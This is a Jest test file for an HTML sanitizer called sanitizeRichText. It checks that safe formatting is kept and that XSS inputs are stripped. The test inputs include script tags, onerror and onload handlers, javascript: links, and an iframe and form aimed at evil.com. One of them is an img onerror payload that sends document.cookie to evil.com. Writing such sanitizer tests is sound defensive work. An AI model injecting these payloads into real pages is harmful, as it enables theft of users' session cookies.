import { describe, it, expect } from '@jest/globals';
import { sanitizeRichText } from '../../../utils/sanitize';

describe('sanitizeRichText', () => {
  it('returns empty string for undefined input', () => {
    expect(sanitizeRichText(undefined)).toBe('');
  });

  it('returns empty string for empty string input', () => {
    expect(sanitizeRichText('')).toBe('');
  });

  it('preserves safe HTML tags', () => {
    const input = '<p>Hello <strong>world</strong></p>';
    expect(sanitizeRichText(input)).toBe('<p>Hello <strong>world</strong></p>');
  });

  it('preserves ordered lists', () => {
    const input = '<ol><li>Step 1</li><li>Step 2</li></ol>';
    expect(sanitizeRichText(input)).toBe('<ol><li>Step 1</li><li>Step 2</li></ol>');
  });

  it('preserves links with safe attributes', () => {
    const input = '<a href="https://example.com" target="_blank" rel="noopener noreferrer">Link</a>';
    expect(sanitizeRichText(input)).toBe(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer">Link</a>'
    );
  });

  it('strips script tags (XSS prevention)', () => {
    const input = '<p>Hello</p><script>alert("XSS")</script>';
    const result = sanitizeRichText(input);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('alert');
    expect(result).toContain('<p>Hello</p>');
  });

  it('strips onerror event handlers (XSS prevention)', () => {
    const input = '<img src="x" onerror="alert(\'XSS\')">';
    const result = sanitizeRichText(input);
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('alert');
  });

  it('strips onload event handlers (XSS prevention)', () => {
    const input = '<div onload="alert(\'XSS\')">content</div>';
    const result = sanitizeRichText(input);
    expect(result).not.toContain('onload');
    expect(result).not.toContain('alert');
  });

  it('strips javascript: protocol in links (XSS prevention)', () => {
    const input = '<a href="javascript:alert(\'XSS\')">Click me</a>';
    const result = sanitizeRichText(input);
    expect(result).not.toContain('javascript:');
  });

  it('strips iframe tags', () => {
    const input = '<iframe src="https://evil.com"></iframe>';
    const result = sanitizeRichText(input);
    expect(result).not.toContain('<iframe');
  });

  it('strips form and input elements', () => {
    const input = '<form action="https://evil.com"><input type="text" value="steal data"></form>';
    const result = sanitizeRichText(input);
    expect(result).not.toContain('<form');
    expect(result).not.toContain('<input');
  });

  it('preserves formatting used by rich text editor', () => {
    const input = '<ol><li><strong>Action:</strong> Click submit</li></ol>';
    expect(sanitizeRichText(input)).toBe(
      '<ol><li><strong>Action:</strong> Click submit</li></ol>'
    );
  });

  it('handles complex nested malicious content', () => {
    const input = '<p>Normal text</p><script>document.cookie</script><img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';
    const result = sanitizeRichText(input);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('document.cookie');
    expect(result).not.toContain('onerror');
    expect(result).toContain('<p>Normal text</p>');
  });
});
